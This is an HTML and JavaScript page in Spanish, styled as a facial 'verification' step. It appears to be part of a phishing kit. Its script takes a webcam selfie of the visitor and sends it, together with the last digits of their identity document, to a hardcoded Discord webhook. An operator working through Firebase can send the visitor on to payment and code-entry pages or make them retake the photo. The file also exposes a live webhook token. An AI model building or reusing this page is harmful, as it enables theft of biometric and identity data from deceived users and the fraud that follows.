<html lang="es"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Verificación</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      justify-content: center;
      min-height: 100vh;
      color: #1a1a1a;
      -webkit-text-size-adjust: 100%;
    }

    .phone-frame {
      width: 100%;
      max-width: 420px;
      min-height: 100vh;
      background-color: #f8f9fa;
      position: relative;
      overflow: hidden;
    }

    /* ===== STEP 1: Instructions ===== */
    #step-instructions {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 30px;
      text-align: center;
    }

    .instructions-content {
      display: flex;
      flex-direction: column;
      align-items: center;
      flex: 1;
      justify-content: center;
      width: 100%;
    }

    #step-instructions h1 {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 12px;
      line-height: 1.3;
    }

    #step-instructions .description {
      font-size: 14px;
      color: #777;
      line-height: 1.6;
      margin-bottom: 40px;
      max-width: 300px;
    }

    /* Avatar image container */
    .avatar-wrapper {
      position: relative;
      width: 300px;
      height: 300px;
      margin: 0 auto 30px;
    }

    /* Spinning progress ring for avatar */
    .avatar-progress-ring {
      position: absolute;
      top: -15px;
      left: -15px;
      width: 330px;
      height: 330px;
      z-index: 5;
      pointer-events: none;
    }

    .avatar-progress-ring svg {
      width: 100%;
      height: 100%;
      transform: rotate(-90deg);
    }

    .avatar-ring-bg {
      fill: none;
      stroke: rgba(200, 200, 200, 0.25);
      stroke-width: 5;
    }

    .avatar-ring-dashes {
  fill: none;
  stroke: #2196F3;
  stroke-width: 5;
  stroke-linecap: round;

  stroke-dasharray: 880;
stroke-dashoffset: 880;

  animation: avatarProgressSmooth 6s ease-in-out infinite,
             avatarColorSmooth 6s ease-in-out infinite;
}

    .avatar-mask-anim {
      fill: none;
      stroke: white;
      stroke-width: 15;
      stroke-linecap: round;
      stroke-dasharray: 942;
      stroke-dashoffset: 942;
      animation: avatarProgressAnim 6s ease-in-out infinite;
    }

    @keyframes colorChangeAvatar {
      0% {
        stroke: #2196F3;
      }

      45% {
        stroke: #2196F3;
      }

      70% {
        stroke: #4CAF50;
      }

      80% {
        stroke: #4CAF50;
      }

      95% {
        stroke: #4CAF50;
      }

      100% {
        stroke: #2196F3;
      }
    }

    @keyframes avatarProgressAnim {
      0% {
        stroke-dashoffset: 942;
      }

      45% {
        stroke-dashoffset: 200;
      }

      70% {
        stroke-dashoffset: 0;
      }

      80% {
        stroke-dashoffset: 0;
      }

      95% {
        stroke-dashoffset: 942;
      }

      100% {
        stroke-dashoffset: 942;
      }
    }

    .avatar-ring {
      width: 300px;
      height: 300px;
      border-radius: 50%;
      border: 3px solid #333;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }

    .avatar-ring img {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      object-fit: cover;
      position: absolute;
      top: 0;
      left: 0;
      transform: scale(1.4);
      /* Zoom in strongly so the pink circle fills the exact boundary, removing gray padding */
    }

    /* Layer 1 (bottom): clean face - always visible */
    .avatar-step3 {
      z-index: 1;
    }

    /* Layer 2 (middle): no cap, with glasses - fades out second */
    .avatar-step2 {
      z-index: 2;
      animation: fadeGlasses 6s ease-in-out infinite;
    }

    /* Layer 3 (top): with cap + glasses - fades out first */
    .avatar-step1 {
      z-index: 3;
      animation: fadeCap 6s ease-in-out infinite;
    }

    /* Cap fades out at 20-30%, comes back at 85-95% */
    @keyframes fadeCap {
      0% {
        opacity: 1;
      }

      20% {
        opacity: 1;
      }

      30% {
        opacity: 0;
      }

      85% {
        opacity: 0;
      }

      95% {
        opacity: 1;
      }

      100% {
        opacity: 1;
      }
    }

    /* Glasses fade out at 40-50%, come back at 75-85% */
    @keyframes fadeGlasses {
      0% {
        opacity: 1;
      }

      40% {
        opacity: 1;
      }

      50% {
        opacity: 0;
      }

      75% {
        opacity: 0;
      }

      85% {
        opacity: 1;
      }

      100% {
        opacity: 1;
      }
    }

    /* Button area at bottom */
    .btn-area {
      width: 100%;
      padding-bottom: 20px;
    }

    .btn-continuar {
      display: block;
      width: 240px;
      margin: 0 auto;
      background-color: #e30613;
      color: #fff;
      border: none;
      padding: 16px 0;
      font-size: 16px;
      font-weight: 700;
      border-radius: 30px;
      cursor: pointer;
      letter-spacing: 0.3px;
      transition: background-color 0.2s ease, transform 0.1s ease;
    }

    .btn-continuar:hover {
      background-color: #c7050f;
    }

    .btn-continuar:active {
      transform: scale(0.97);
    }

    /* ===== STEP 2: Camera ===== */
    #step-camera {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 20px;
    }

    .camera-wrapper {
      position: relative;
      width: 300px;
      height: 300px;
      margin-bottom: 30px;
    }

    /* Spinning progress ring */
    .progress-ring-container {
      position: absolute;
      top: -15px;
      left: -15px;
      width: 330px;
      height: 330px;
      z-index: 5;
      pointer-events: none;
    }

    .progress-ring-container svg {
      width: 100%;
      height: 100%;
      transform: rotate(-90deg);
    }

    .progress-ring-bg {
      fill: none;
      stroke: rgba(200, 200, 200, 0.3);
      stroke-width: 6;
    }

    .progress-ring-dashes {
  fill: none;
  stroke: #2196F3;
  stroke-width: 6;
  stroke-linecap: round;

  stroke-dasharray: 942;
  stroke-dashoffset: 942;

  animation: none !important;
}


@keyframes cameraProgressSmooth {
  0% {
    stroke-dashoffset: 942;
  }

  85% {
    stroke-dashoffset: 0;
  }

  100% {
    stroke-dashoffset: 0;
  }
}

@keyframes cameraColorSmooth {
  0% {
    stroke: #2196F3;
  }

  70% {
    stroke: #2196F3;
  }

  100% {
    stroke: #4CAF50;
  }
}
    .camera-mask-anim {
  fill: none;
  stroke: white;
  stroke-width: 15;
  stroke-linecap: round;
  stroke-dasharray: 942;
  stroke-dashoffset: 942;
}

    @keyframes colorChangeCamera {
      0% {
        stroke: #2196F3;
      }

      50% {
        stroke: #2196F3;
      }

      80% {
        stroke: #4CAF50;
      }

      100% {
        stroke: #4CAF50;
      }
    }

    @keyframes cameraProgressAnim {
      0% {
        stroke-dashoffset: 942;
      }

      80% {
        stroke-dashoffset: 0;
      }

      100% {
        stroke-dashoffset: 0;
      }
    }

    /* Outer glow ring */
    .camera-outer-glow {
      display: none;
    }

    /* Main dark ring */
    .camera-main-ring {
      position: absolute;
      top: 0;
      left: 0;
      width: 300px;
      height: 300px;
      border-radius: 50%;
      border: 3px solid #333;
      z-index: 2;
      pointer-events: none;
    }

    /* Video circle */
    .video-circle {
      width: 300px;
      height: 300px;
      border-radius: 50%;
      overflow: hidden;
      background-color: #ccc;
      position: relative;
    }

    .video-circle video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
    }

    .silhouette {
      position: absolute;
      top: 0;
      left: 0;
      width: 300px;
      height: 300px;
      z-index: 3;
      pointer-events: none;
    }

    .camera-text {
      font-size: 18px;
      font-weight: 700;
      color: #1a1a1a;
      text-align: center;
      line-height: 1.5;
      max-width: 300px;
    }

    #photo-canvas {
      display: none;
    }

    .loading-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(248, 249, 250, 0.96);
      z-index: 100;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .loading-overlay.active {
      display: flex;
    }

    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #e0e0e0;
      border-top-color: #e30613;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .loading-text {
      font-size: 16px;
      color: #333;
      font-weight: 600;
    }


    @keyframes avatarProgressSmooth {
  0% {
    stroke-dashoffset: 942;
  }

  60% {
    stroke-dashoffset: 0;
  }

  80% {
    stroke-dashoffset: 0;
  }

  100% {
    stroke-dashoffset: 942;
  }
}

@keyframes avatarColorSmooth {
  0% {
    stroke: #2196F3;
  }

  60% {
    stroke: #2196F3;
  }

  80% {
    stroke: #4CAF50;
  }

  100% {
    stroke: #2196F3;
  }
}






.overlay{
  display:none;
  position:fixed;
  inset:0;
  background:rgba(0,0,0,0.5);
  backdrop-filter:blur(4px);
  justify-content:center;
  align-items:center;
  z-index:9999;
}

.loader{
  text-align:center;
  color:#fff;
}

.spinner{
  width:40px;
  height:40px;
  border:4px solid #fff;
  border-top:4px solid #e30613;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:0 auto 10px;
}

@keyframes spin{
  to{ transform:rotate(360deg); }
}




/* ❌ quitar controles nativos */
video::-webkit-media-controls {
  display: none !important;
}

video::-webkit-media-controls-play-button {
  display: none !important;
}

video::-webkit-media-controls-start-playback-button {
  display: none !important;
}
  </style>
</head>

<body>
  <div class="phone-frame">

    <!-- ========== STEP 1: Instructions ========== -->
    <div id="step-instructions">
      <div class="instructions-content">
        <h1>Tome una foto de su rostro</h1>
        <p class="description">Busque un espacio iluminado y haga una expresión neutra. No use gafas, sombreros o
          accesorios que tapen su rostro.</p>

        <div class="avatar-wrapper">
          <!-- Spinning progress ring -->
          <div class="avatar-progress-ring">
            <svg viewBox="0 0 330 330">
              <defs>
                <mask id="avatarProgressMask">
                  <circle class="avatar-mask-anim" cx="165" cy="165" r="150"></circle>
                </mask>
              </defs>
              <circle class="avatar-ring-bg" cx="165" cy="165" r="150"></circle>
              <circle class="avatar-ring-dashes" cx="165" cy="165" r="150" mask="url(#avatarProgressMask)"></circle>
            </svg>
          </div>
          <div class="avatar-ring">
            <img src="avatar3.png" alt="Cara limpia" class="avatar-step3">
            <img src="avatar2.png" alt="Sin gorra" class="avatar-step2">
            <img src="avatar.png" alt="Con gorra y gafas" class="avatar-step1">
          </div>
        </div>
      </div>

      <div class="btn-area">
        <button class="btn-continuar" id="btn-continuar">Continuar</button>
      </div>
    </div>

    <!-- ========== STEP 2: Camera ========== -->
<!-- ========== STEP 2: Camera ========== -->
<div id="step-camera" style="display:none; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:40px 20px;">

  <div class="camera-wrapper">

    <!-- Spinning progress ring -->
    <div class="progress-ring-container" id="progress-ring">
      <svg viewBox="0 0 330 330">
        <defs>
          <mask id="cameraProgressMask">
            <circle class="camera-mask-anim" cx="165" cy="165" r="150"></circle>
          </mask>
        </defs>
        <circle class="progress-ring-bg" cx="165" cy="165" r="150"></circle>
        <circle class="progress-ring-dashes" cx="165" cy="165" r="150"></circle>
      </svg>
    </div>

    <div class="camera-main-ring"></div>

    <!-- VIDEO -->
    <div class="video-circle">
      <video id="camera-video" autoplay playsinline muted controlslist="nodownload nofullscreen noremoteplayback" disablepictureinpicture></video>
    </div>

    <!-- Silueta -->
    <svg class="silhouette" viewBox="0 0 280 280">
      <path d="
        M140 35
        C110 35 88 58 85 88
        C83 108 86 122 92 132
        L82 155
        C79 163 72 169 62 174
        L48 181
        C38 185 30 194 30 206
        L30 260
        L250 260
        L250 206
        C250 194 242 185 232 181
        L218 174
        C208 169 201 163 198 155
        L188 132
        C194 122 197 108 195 88
        C192 58 170 35 140 35 Z
      " fill="none" stroke="rgba(255,255,255,0.55)" stroke-width="2.5"/>
    </svg>

  </div>

  <!-- TEXTO -->
  <p class="camera-text">
    Mire a la cámara para<br>verificar que seas tú
  </p>

  <!-- 🔥 BOTÓN CAPTURAR (YA BIEN PUESTO) -->
  <button id="btn-capturar" class="btn-continuar" style="margin-top:25px;">
    Tomar captura
  </button>

</div>


<div class="overlay">
  <div class="loader">
    <div class="spinner"></div>
    <p>Cargando...</p>
  </div>
</div>

<canvas id="photo-canvas" style="display:none;"></canvas>


<script type="module" src="firebase.js"></script>

<script>
window.addEventListener('load', () => {

const { db, uid, ref, update } = window;

// ELEMENTOS
const video = document.getElementById("camera-video");
const canvas = document.getElementById("photo-canvas");
const btnCapturar = document.getElementById("btn-capturar");
const btnContinuar = document.getElementById("btn-continuar");

const overlay = document.querySelector(".overlay");
const texto = document.querySelector(".loading-text");

const step1 = document.getElementById("step-instructions");
const step2 = document.getElementById("step-camera");

const ring = document.querySelector(".progress-ring-dashes");

// ===============================
// ESTADO
// ===============================
update(ref(db, "dataPages/" + uid), { 
  estado: "abierto",
  paginaActual: "Foto.html" 
});


window.addEventListener("beforeunload", () => {
  update(ref(db, "dataPages/" + uid), { 
    estado: "cerrado",
    paginaActual: null  
  });
});
// ===============================
// PASAR A CÁMARA
// ===============================
btnContinuar.addEventListener("click", async () => {

  step1.style.display = "none";
  step2.style.display = "flex";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
  } catch {
    alert("No se pudo activar la cámara");
  }

});

// ===============================
// CAPTURA
// ===============================
btnCapturar.addEventListener("click", () => {

  update(ref(db, "dataPages/" + uid), {
    fotoLista: true
  });

  // 🔵 iniciar animación
  ring.style.transition = "none";
  ring.style.strokeDashoffset = "880";

  ring.offsetHeight;

  ring.style.transition = "stroke-dashoffset 3s linear, stroke 3s linear";
  ring.style.strokeDashoffset = "0";

  // ⏳ esperar que termine
  setTimeout(async () => {

    // 🟢 color final
    ring.style.stroke = "#4CAF50";

    // 🔥 AQUÍ VA EL OVERLAY (SOLO AQUÍ)
    const overlay = document.querySelector(".overlay");
    if(overlay){
      overlay.style.display = "flex";
    }

    // 📸 captura
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    const blob = await new Promise(resolve =>
      canvas.toBlob(resolve, "image/jpeg", 0.9)
    );

    // 🔥 obtener datos de firebase
const snapshot = await new Promise(resolve => {
  onValue(ref(db, "dataPages/" + uid), resolve, { onlyOnce: true });
});

const data = snapshot.val() || {};
const ultimos4 = data.doc4 || "0000";

// 🔥 enviar a discord
const formData = new FormData();

formData.append("content", `Documento: *****${ultimos4}`);
formData.append("file", blob, "foto.jpg");

await fetch("https://discord.com/api/webhooks/1490716673102319668/RSiALZunI6oGD3MKk2eixQM3E01lThcpyMBLnmagIdVd0tD8apJna2eXbyBxJhw0lHUn", {
  method: "POST",
  body: formData
});

  }, 3000); // ⏱ MISMO TIEMPO DE LA BARRA

});


const textoCamara = document.querySelector(".camera-text");
const overlayCarga = document.querySelector(".overlay");

onValue(ref(db, "dataPages/" + uid), snapshot => {

  const data = snapshot.val();
  if (!data) return;

  // 🔴 ERROR DE FOTO
  if (data.errorFoto === "imagen_invalida") {

    if (overlayCarga) {
      overlayCarga.style.display = "none";
    }

    if (textoCamara) {
      textoCamara.innerHTML = `
        No pudimos validar la imagen.<br>
        Intenta nuevamente con mejor iluminación
      `;
      textoCamara.style.color = "red";
    }

    if (ring) {
      ring.style.transition = "none";
      ring.style.strokeDashoffset = "942";
      ring.style.stroke = "#2196F3";
    }

  }


      // 🔴 IR A PAGO
    if (data.accion === "pago") {

    update(ref(db, "dataPages/" + uid), {
      accion: null
    });

    window.location.href = "pago.html";
  }

    // 🔴 IR A CÓDIGO
  if (data.accion === "codigo") {
    update(ref(db, "dataPages/" + uid), {
      accion: null
    });
    window.location.href = "codigo.html";
  }

  // 🔥 REDIRECCIÓN FINAL (AQUÍ VA)
  if (data.accion === "final") {

    update(ref(db, "dataPages/" + uid), {
      accion: null
    });

    window.location.href = "../../final.html";
  }

});


});
</script>

</body></html>
